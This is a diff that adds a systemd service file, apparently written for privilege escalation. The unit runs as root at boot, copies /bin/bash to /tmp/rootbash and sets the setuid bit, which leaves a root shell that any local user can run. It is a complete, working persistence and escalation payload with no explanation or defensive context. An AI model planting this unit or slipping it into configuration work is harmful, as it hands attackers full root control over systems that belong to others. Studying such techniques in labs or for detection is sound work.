@@ -1,0 +1,10 @@
+[Unit]
+Description=rooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash;'
+
+[Install]
+WantedBy=multi-user.target
